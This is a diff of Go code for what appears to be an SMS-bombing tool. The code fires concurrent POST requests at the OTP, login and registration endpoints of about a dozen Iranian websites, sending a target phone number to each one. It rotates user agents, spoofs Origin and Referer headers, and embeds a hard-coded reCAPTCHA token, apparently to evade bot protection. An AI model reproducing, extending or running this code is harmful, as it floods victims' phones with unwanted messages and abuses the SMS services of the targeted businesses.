@@ -541,30 +541,7 @@ tasks <- func(c *http.Client) func() {
 }(client)
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-// ------ alibaba (تبدیل از پایتون به Go) ------
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "phoneNumber": "0" + getPhoneNumberNoZero(phone),
-        }
-        sendJSONRequest(c, ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", payload, &wg, ch)
-    }
-}(client)
-
-// ------ okorosh (تبدیل از پایتون به Go) ------
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "mobile": "0" + getPhoneNumberNoZero(phone),
-            "g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe",
-        }
-        sendJSONRequest(c, ctx, "https://my.okcs.com/api/check-mobile", payload, &wg, ch)
-    }
-}(client)
-
-// ------ https://www.1001kharid.com/wp-admin/admin-ajax.php ------
+// 1. 1001kharid.com (POST Form)
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -590,7 +567,7 @@ tasks <- func(c *http.Client) func() {
     }
 }(client)
 
-// ------ https://1000gem.org/livewire/message/login-register ------
+// 2. 1000gem.org (POST JSON - Livewire)
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -599,13 +576,15 @@ tasks <- func(c *http.Client) func() {
                 {
                     "type": "syncInput",
                     "payload": map[string]interface{}{
-                        "id": "erab", "name": "phone", "value": phone,
+                        "name":  "phone",
+                        "value": phone,
                     },
                 },
                 {
                     "type": "callMethod",
                     "payload": map[string]interface{}{
-                        "id": "0k13", "method": "sendsms", "params": []interface{}{},
+                        "method": "sendsms",
+                        "params": []interface{}{},
                     },
                 },
             },
@@ -614,7 +593,7 @@ tasks <- func(c *http.Client) func() {
     }
 }(client)
 
-// ------ https://www.hamrah-mechanic.com/api/v1/membership/otp ------
+// 3. hamrah-mechanic.com (POST JSON)
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -630,7 +609,7 @@ tasks <- func(c *http.Client) func() {
     }
 }(client)
 
-// ------ https://nickdigi.ir/wp-content/plugins/Shahkar/includes/AJAX/Clients/AUTH/CheckUserExists.php ------
+// 4. nickdigi.ir (CheckUserExists)
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -640,8 +619,7 @@ tasks <- func(c *http.Client) func() {
         sendFormRequest(c, ctx, "https://nickdigi.ir/wp-content/plugins/Shahkar/includes/AJAX/Clients/AUTH/CheckUserExists.php", formData, &wg, ch)
     }
 }(client)
-
-// ------ https://nickdigi.ir/wp-content/plugins/Shahkar/includes/AJAX/Clients/AUTH/register.php ------
+// 4. nickdigi.ir (register.php)
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -651,7 +629,7 @@ tasks <- func(c *http.Client) func() {
     }
 }(client)
 
-// ------ https://70kala.ir/wp-admin/admin-ajax.php ------
+// 5. 70kala.ir (POST Form)
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -663,12 +641,30 @@ tasks <- func(c *http.Client) func() {
         formData.Set("instance_id", "7b0048080e38e916af365b7a33363096")
         formData.Set("action", "digits_forms_ajax")
         formData.Set("type", "login")
-        // بقیه فیلدها مقدار خاص ندارند
+        formData.Set("digits_step_1_type", "")
+        formData.Set("digits_step_1_value", "")
+        formData.Set("digits_step_2_type", "")
+        formData.Set("digits_step_2_value", "")
+        formData.Set("digits_step_3_type", "")
+        formData.Set("digits_step_3_value", "")
+        formData.Set("digits_login_email_token", "")
+        formData.Set("digits_redirect_page", "//70kala.ir/?page=1&redirect_to=https%3A%2F%2F70kala.ir%2F")
+        formData.Set("digits_form", "3057f39e8c")
+        formData.Set("_wp_http_referer", "/?login=true&page=1&redirect_to=https%3A%2F%2F70kala.ir%2F")
+        formData.Set("show_force_title", "1")
         sendFormRequest(c, ctx, "https://70kala.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
     }
 }(client)
 
-// ------ https://geminja.com/login?type=register ------
+// 6. geminja.com (sendSmsMelliPayamak)
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        sendFormRequest(c, ctx, "https://geminja.com/wp-json/api/sendSmsMelliPayamak", formData, &wg, ch)
+    }
+}(client)
+// 6. geminja.com (register)
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -676,12 +672,13 @@ tasks <- func(c *http.Client) func() {
         formData.Set("type", "register")
         formData.Set("regMobile", phone)
         formData.Set("dlr-register", "ثبت نام")
-        formData.Set("_dlr_mobits", "register")
+        formData.Set("_dlr_mobits", "")
+        formData.Set("register", "")
         sendFormRequest(c, ctx, "https://geminja.com/login?type=register", formData, &wg, ch)
     }
 }(client)
 
-// ------ https://gooshi.online/site/api/v1/user/otp ------
+// 7. gooshi.online (POST JSON)
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -696,7 +693,7 @@ tasks <- func(c *http.Client) func() {
     }
 }(client)
 
-// ------ https://www.vidovin.com/Users/LoginPopup ------
+// 8. vidovin.com (POST JSON)
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
@@ -707,27 +704,83 @@ tasks <- func(c *http.Client) func() {
     }
 }(client)
 
-// ------ https://my.limoome.com/auth/check-mobile ------
+// 9. my.limoome.com (POST JSON)
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
     return func() {
         payload := map[string]interface{}{
-            "mobileNumber": strings.TrimPrefix(phone, "0"),
-            "countryId": "1",
-        }
-        sendJSONRequest(c, ctx, "https://my.limoome.com/auth/check-mobile", payload, &wg, ch)
-    }
-}(client)
-
-// ------ https://my.limoome.com/api/auth/login/otp ------
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "mobileNumber": strings.TrimPrefix(phone, "0"),
+            "mobileNumber": getPhoneNumberNoZero(phone),
             "country": "1",
         }
         sendJSONRequest(c, ctx, "https://my.limoome.com/api/auth/login/otp", payload, &wg, ch)
+    }
+}(client)
+
+// 10. alibaba.ir
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "phoneNumber": "0" + getPhoneNumberNoZero(phone),
+        }
+        jsonData, _ := json.Marshal(payload)
+        req, _ := http.NewRequestWithContext(ctx, http.MethodPost, "https://ws.alibaba.ir/api/v3/account/mobile/otp", bytes.NewBuffer(jsonData))
+        req.Header.Set("Host", "ws.alibaba.ir")
+        req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
+        req.Header.Set("Accept", "application/json, text/plain, */*")
+        req.Header.Set("Accept-Language", "en-US,en;q=0.5")
+        req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+        req.Header.Set("ab-channel", "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR")
+        req.Header.Set("ab-alohomora", "MTMxOTIzNTI1MjU2NS4yNTEy")
+        req.Header.Set("Content-Type", "application/json;charset=utf-8")
+        req.Header.Set("Origin", "https://www.alibaba.ir")
+        req.Header.Set("Referer", "https://www.alibaba.ir/hotel")
+        req.Header.Set("Connection", "keep-alive")
+        resp, err := c.Do(req)
+        if err != nil {
+            ch <- http.StatusInternalServerError
+        } else {
+            ch <- resp.StatusCode
+            resp.Body.Close()
+        }
+        wg.Done()
+    }
+}(client)
+
+// 11. okorosh 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "mobile": "0" + getPhoneNumberNoZero(phone),
+            "g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe", 
+        }
+        jsonData, _ := json.Marshal(payload)
+        req, _ := http.NewRequestWithContext(ctx, http.MethodPost, "https://my.okcs.com/api/check-mobile", bytes.NewBuffer(jsonData))
+        req.Header.Set("accept", "application/json, text/plain, */*")
+        req.Header.Set("content-type", "application/json;charset=UTF-8")
+        req.Header.Set("origin", "https://my.okcs.com")
+        req.Header.Set("referer", "https://my.okcs.com/")
+        req.Header.Set("user-agent", userAgents[rand.Intn(len(userAgents))])
+        resp, err := c.Do(req)
+        if err != nil {
+            ch <- http.StatusInternalServerError
+        } else {
+            ch <- resp.StatusCode
+            resp.Body.Close()
+        }
+        wg.Done()
+    }
+}(client)
+
+// 12. limome (POST Form)
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("mobileNumber", getPhoneNumberNoZero(phone))
+        formData.Set("country", "1")
+        sendFormRequest(c, ctx, "https://my.limoome.com/api/auth/login/otp", formData, &wg, ch)
     }
 }(client)
 
